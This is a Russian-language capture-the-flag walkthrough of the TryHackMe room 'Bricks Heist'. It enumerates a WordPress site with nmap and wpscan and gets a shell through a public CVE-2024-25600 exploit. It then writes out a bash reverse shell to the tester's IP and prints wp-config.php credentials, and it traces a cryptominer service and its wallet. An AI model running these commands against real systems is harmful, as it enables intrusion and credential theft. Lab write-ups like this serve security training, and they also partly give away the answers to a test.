## Tryhack3mbricksheist

- https://tryhackme.com/room/tryhack3mbricksheist
## Разведка

Сканируем сеть
nmap -sC -sV
- Стандартные скрипты
- сканирование версий
```bash
└─$ nmap -sC -sV 10.80.177.238
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-26 16:02 +0300
Nmap scan report for 10.80.177.238
Host is up (0.084s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 a3:37:78:c3:03:29:78:bd:ec:08:e7:84:cc:24:28:ae (RSA)
|   256 05:ad:6a:b0:30:0e:cc:7e:ae:6d:df:8c:13:4f:b9:6b (ECDSA)
|_  256 08:23:e6:ea:7f:6d:3d:75:c9:31:65:5a:ef:22:e6:4d (ED25519)
80/tcp   open  http     Python http.server 3.5 - 3.10
|_http-title: Error response
|_http-server-header: WebSockify Python/3.8.10
443/tcp  open  ssl/http Apache httpd
|_http-generator: WordPress 6.5
| tls-alpn: 
|   h2
|_  http/1.1
| ssl-cert: Subject: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=US
| Not valid before: 2024-04-02T11:59:14
|_Not valid after:  2025-04-02T11:59:14
|_ssl-date: TLS randomness does not represent time
| http-robots.txt: 1 disallowed entry 
|_/wp-admin/
|_http-server-header: Apache
|_http-title: Brick by Brick
3306/tcp open  mysql    MySQL (unauthorized)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 50.99 seconds
```
- 22 - ssh
- 80 - http
- 443 - https

На 80 порту ничего нет.
Зайдем на 443 и посмотрим что там
<img width="1470" height="839" alt="Pasted image 20260126170923" src="https://github.com/user-attachments/assets/60b69cd2-8209-40b4-851f-f09005fe3b38" />

Из nmap разведки стало известно о директории /wp-admin/, поэтому сразу запустим wpscan c флагом --disable-tls-checks
```bash
└─$ wpscan --url https://bricks.thm --disable-tls-checks
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: https://bricks.thm/ [10.80.177.238]
[+] Started: Mon Jan 26 16:27:25 2026

Interesting Finding(s):

[+] Headers
 | Interesting Entry: server: Apache
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: https://bricks.thm/robots.txt
 | Interesting Entries:
 |  - /wp-admin/
 |  - /wp-admin/admin-ajax.php
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: https://bricks.thm/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: https://bricks.thm/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: https://bricks.thm/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 6.5 identified (Insecure, released on 2024-04-02).
 | Found By: Rss Generator (Passive Detection)
 |  - https://bricks.thm/feed/, <generator>https://wordpress.org/?v=6.5</generator>
 |  - https://bricks.thm/comments/feed/, <generator>https://wordpress.org/?v=6.5</generator>

[+] WordPress theme in use: bricks
 | Location: https://bricks.thm/wp-content/themes/bricks/
 | Readme: https://bricks.thm/wp-content/themes/bricks/readme.txt
 | Style URL: https://bricks.thm/wp-content/themes/bricks/style.css
 | Style Name: Bricks
 | Style URI: https://bricksbuilder.io/
 | Description: Visual website builder for WordPress....
 | Author: Bricks
 | Author URI: https://bricksbuilder.io/
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Urls In 404 Page (Passive Detection)
 |
 | Version: 1.9.5 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - https://bricks.thm/wp-content/themes/bricks/style.css, Match: 'Version: 1.9.5'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:04 <====================> (137 / 137) 100.00% Time: 00:00:04

[i] No Config Backups Found.

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Mon Jan 26 16:27:34 2026
[+] Requests Done: 170
[+] Cached Requests: 7
[+] Data Sent: 41.448 KB
[+] Data Received: 110.502 KB
[+] Memory used: 268.676 MB
[+] Elapsed time: 00:00:09
```

Стало известно о версии WP:
```bash
WordPress version 6.5 identified
```



Поищем  CVE на данную уязвимость. Я нашел CVE-2024-25600, и сразу же для нее эксплойт.
- https://github.com/Chocapikk/CVE-2024-25600
```bash 
─$ git clone https://github.com/Chocapikk/CVE-2024-25600.git                       
Cloning into 'CVE-2024-25600'...
remote: Enumerating objects: 51, done.
remote: Counting objects: 100% (51/51), done.
remote: Compressing objects: 100% (38/38), done.
remote: Total 51 (delta 18), reused 45 (delta 12), pack-reused 0 (from 0)
Receiving objects: 100% (51/51), 20.83 KiB | 3.47 MiB/s, done.
Resolving deltas: 100% (18/18), done.
```

Создаем окружение и устанавливаем зависимости:
```bash 
└─$ python3 -m venv myenv

└─$ source myenv/bin/activate

└─$ pip install -r requirements.txt
```

Запускаем exploit.py для нашего сайта:
```bash
└─$ python3 exploit.py -u https://bricks.thm/
[*] Nonce found: 9c17e8ac4f
[+] https://bricks.thm/ is vulnerable to CVE-2024-25600. Command output: apache
[!] Shell is ready, please type your commands UwU
# ls
650c844110baced87e1606453b93f22a.txt
index.php
kod
license.txt
phpmyadmin
readme.html
wp-activate.php
wp-admin
wp-blog-header.php
wp-comments-post.php
wp-config-sample.php
wp-config.php
wp-content
wp-cron.php
wp-includes
wp-links-opml.php
wp-load.php
wp-login.php
wp-mail.php
wp-settings.php
wp-signup.php
wp-trackback.php
xmlrpc.php 

# cat 650c844110baced87e1606453b93f22a.txt
[REDACTED]

```
Данный эксплойт позволяет получить оболочку, читаем файл, это ответ на первый вопрос.

Улучшим наш шелл командами:
У себя открываем порт
```bash 
└─$ nc -lvnp 4444
listening on [any] 4444 ...
```

И запускаем класическую команду для реверс шелла, свой ip можно узнать командой `ip a`
```bash
# bash -c 'exec bash -i &>/dev/tcp/192.168.155.3/4444 <&1'
```

И получаем шелл,
```bash
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.155.3] from (UNKNOWN) [10.80.177.238] 60904
bash: cannot set terminal process group (1295): Inappropriate ioctl for device
bash: no job control in this shell
apache@ip-10-80-177-238:/data/www/default$
```

Читаем конфиг
```
apache@ip-10-80-177-238:/data/www/default$ cat wp-config.php
cat wp-config.php
<?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the installation.
 * You don't have to use the web site, you can copy this file to "wp-config.php"
 * and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * Database settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://wordpress.org/documentation/article/editing-wp-config-php/
 *
 * @package WordPress
 */

// ** Database settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** Database username */
define( 'DB_USER', 'root' );

/** Database password */
define( 'DB_PASSWORD', 'lamp.sh' );

/** Database hostname */
define( 'DB_HOST', 'localhost' );

/** Database charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8mb4' );

/** The database collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

/**#@+
 * Authentication unique keys and salts.
 *
 * Change these to different unique phrases! You can generate these using
 * the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}.
 *
 * You can change these at any point in time to invalidate all existing cookies.
 * This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define( 'AUTH_KEY',         '?HI~$7a0sn[(C=+kmx=JDV63[]sOnqKx|G51mk5f$igT~/NjljMgA#L dR]YUa z' );
define( 'SECURE_AUTH_KEY',  'VHqhArawbk GIa?/yw@5wKL8^n;X#1[~dx7ip/8d,CTMoowa7I>D>t]%,@V+Dff8' );
define( 'LOGGED_IN_KEY',    'N~l1*HAb~|6UV;]pkI./Tu11Z8$}1a{ZH0p2.z%221w]{vj<g?ELvb+qgWp u>r6' );
define( 'NONCE_KEY',        'Wu/sg/)nHQJ|sggXMb(@<,;NCc[AcMlL!5}p_N;fqmr-$Tt1Ex6x:(%T{{Ht&!Re' );
define( 'AUTH_SALT',        'zi$l=XQKDA0hF8Q4c(2]o_kU:!lz?;xuQkU3zB#8DnLZ6CUW:HX@%0FsG6=IRSZE' );
define( 'SECURE_AUTH_SALT', 'tiycIlY-:(Y)6I ayw2t/<#<RWUm6/,DsbY*;!ykNtT!B4|YM&($ u2X)mi.`r8z' );
define( 'LOGGED_IN_SALT',   '(kn%uPE>Up5}ehVO~}qG>]zfHO`oE[vdXzLi.N{)UlKcQ]cr/Vy*yisutrsJZ<&T' );
define( 'NONCE_SALT',       '6rzz2K[ztP}6KM ?5,c2S&)M!y;.}b6M/g{iOzO|sy;0.ePu ><z[v_0aHh$HD%}' );

/**#@-*/

/**
 * WordPress database table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix = 'wp_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the documentation.
 *
 * @link https://wordpress.org/documentation/article/debugging-in-wordpress/
 */
define( 'WP_DEBUG', false );

/* Add any custom values between this line and the "stop editing" line. */

/* That's all, stop editing! Happy publishing. */

/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
        define( 'ABSPATH', __DIR__ . '/' );
}

/** Sets up WordPress vars and included files. */
require_once ABSPATH . 'wp-settings.php';
```
Мы получили креды от БД, но они нам по сути не нужны, в нашем задании другие вопросы

Посмотрим запущенные системные службы, следую сторого по тому что требуется в задании:
```bash
apache@ip-10-80-177-238:/data/www/default$ systemctl list-units — type=service — state=running
<emctl list-units — type=service — state=running
  UNIT LOAD ACTIVE SUB DESCRIPTION
0 loaded units listed. Pass --all to see loaded but inactive units, too.
To show all installed unit files use 'systemctl list-unit-files'.
apache@ip-10-80-177-238:/data/www/default$ systemctl list-units --type=servise --state=running    
<systemctl list-units --type=servise --state=running
Unknown unit type or load state 'servise'.
Use -t help to see a list of allowed values.
apache@ip-10-80-177-238:/data/www/default$ python3 -c 'import pty; pty.spawn("/bin/bash")'
<lt$ python3 -c 'import pty; pty.spawn("/bin/bash")'
apache@ip-10-80-177-238:/data/www/default$ systemctl list-units --type=service --state=running
<systemctl list-units --type=service --state=running
  UNIT                        LOAD   ACTIVE SUB     DESCRIPTION                 
  accounts-daemon.service     loaded active running Accounts Service            
  acpid.service               loaded active running ACPI event daemon           
  atd.service                 loaded active running Deferred execution scheduler
  avahi-daemon.service        loaded active running Avahi mDNS/DNS-SD Stack     
  badr.service                loaded active running Badr Service                
  cron.service                loaded active running Regular background program …
  cups-browsed.service        loaded active running Make remote CUPS printers a…
  cups.service                loaded active running CUPS Scheduler              
  dbus.service                loaded active running D-Bus System Message Bus    
  getty@tty1.service          loaded active running Getty on tty1               
  httpd.service               loaded active running LSB: starts Apache Web Serv…
  irqbalance.service          loaded active running irqbalance daemon           
  kerneloops.service          loaded active running Tool to automatically colle…
  lightdm.service             loaded active running Light Display Manager       
  ModemManager.service        loaded active running Modem Manager               
  multipathd.service          loaded active running Device-Mapper Multipath Dev…
  mysqld.service              loaded active running LSB: start and stop MySQL   
  networkd-dispatcher.service loaded active running Dispatcher daemon for syste…
  NetworkManager.service      loaded active running Network Manager             
  polkit.service              loaded active running Authorization Manager       
  rsyslog.service             loaded active running System Logging Service      
  rtkit-daemon.service        loaded active running RealtimeKit Scheduling Poli…
  serial-getty@ttyS0.service  loaded active running Serial Getty on ttyS0       
  snap.amazon-ssm-agent.amaz… loaded active running Service for snap applicatio…
  snapd.service               loaded active running Snap Daemon                 
  ssh.service                 loaded active running OpenBSD Secure Shell server 
  switcheroo-control.service  loaded active running Switcheroo Control Proxy se…
  systemd-journald.service    loaded active running Journal Service             
  systemd-logind.service      loaded active running Login Service               
  systemd-networkd.service    loaded active running Network Service             
  systemd-resolved.service    loaded active running Network Name Resolution     
  systemd-timesyncd.service   loaded active running Network Time Synchronization
  systemd-udevd.service       loaded active running udev Kernel Device Manager  
  ubuntu.service              loaded active running TRYHACK3M                   
  udisks2.service             loaded active running Disk Manager                
  unattended-upgrades.service loaded active running Unattended Upgrades Shutdown
  upower.service              loaded active running Daemon for power management 
  user@1000.service           loaded active running User Manager for UID 1000   
  user@114.service            loaded active running User Manager for UID 114    
  whoopsie.service            loaded active running crash report submission dae…
  wpa_supplicant.service      loaded active running WPA supplicant              

LOAD   = Reflects whether the unit definition was properly loaded.
ACTIVE = The high-level unit activation state, i.e. generalization of SUB.
SUB    = The low-level unit activation state, values depend on unit type.

41 loaded units listed.
```
Видим подозрительную службу REDACTED c описанием TRYHACK3M, это ответ на третий вопрос, смотрим что она делает:
```bash 
apache@ip-10-80-177-238:/data/www/default$ systemctl cat [REDACTED]
systemctl cat [REDACTED]
# /etc/systemd/system/[REDACTED]
[Unit]
Description=TRYHACK3M

[Service]
Type=simple
ExecStart=/lib/NetworkManager/REDACTED
Restart=on-failure
```
Она запускает некий файл /lib/NetworkManager/REDACTED

Посмотрим что там происходит
```bash
apache@ip-10-80-177-238:/data/www$ cd /lib
cd /lib
apache@ip-10-80-177-238:/lib$ cd NetworkManager
cd NetworkManager
apache@ip-10-80-177-238:/lib/NetworkManager$ ls
ls
VPN             nm-dispatcher           nm-openvpn-service
conf.d          nm-iface-helper         nm-openvpn-service-openvpn-helper
dispatcher.d    nm-inet-dialog          nm-pptp-auth-dialog
inet.conf       nm-initrd-generator     nm-pptp-service
nm-dhcp-helper  nm-openvpn-auth-dialog  system-connections

```

Есть какие-то файлы, по заданию мы должны найти файл с логами, смотрим файл inet.conf это как раз ответ на 4 вопрос

```bash
apache@ip-10-80-177-238:/lib/NetworkManager$ cat inet.conf
cat inet.conf
ID: 5757314e65474e5962484a4f656d787457544e424e574648555446684d3070735930684b616c70555a7a566b52335276546b686b65575248647a525a57466f77546b64334d6b347a526d685a6255313459316873636b35366247315a4d304531595564476130355864486c6157454a3557544a564e453959556e4a685246497a5932355363303948526a4a6b52464a7a546d706b65466c525054303d
2024-04-08 10:46:04,743 [*] confbak: Ready!
2024-04-08 10:46:04,743 [*] Status: Mining!
2024-04-08 10:46:08,745 [*] Miner()
2024-04-08 10:46:08,745 [*] Bitcoin Miner Thread Started
2024-04-08 10:46:08,745 [*] Status: Mining!
2024-04-08 10:46:10,747 [*] Miner()
2024-04-08 10:46:12,748 [*] Miner()
2024-04-08 10:46:14,751 [*] Miner()
2024-04-08 10:46:16,753 [*] Miner()
2024-04-08 10:46:18,755 [*] Miner()
2024-04-08 10:46:20,757 [*] Miner()
...
```

Это майнер, видим ID , пробуем его расшифровать через CyberChef используя параметр Magic.

<img width="1470" height="839" alt="Pasted image 20260126170945" src="https://github.com/user-attachments/assets/8d1926cc-6934-4825-937c-cf12cbff508b" />


Мы получим 2 биткойн адреса, правдивость которых можно проверить на сайте
https://www.blockchain.com/explorer
Адрес кошелька это и есть ответ на 5 вопрос

Теперь там же смотрим историю этого кошелька находим данные получателя

```
32pTjx****n1nVJM
```
<img width="789" height="134" alt="Pasted image 20260126171815" src="https://github.com/user-attachments/assets/3474bfeb-7806-41da-a0c9-b5be242ea6d9" />
Осталось только загуглить получателя и узнаем ответ на последний вопрос


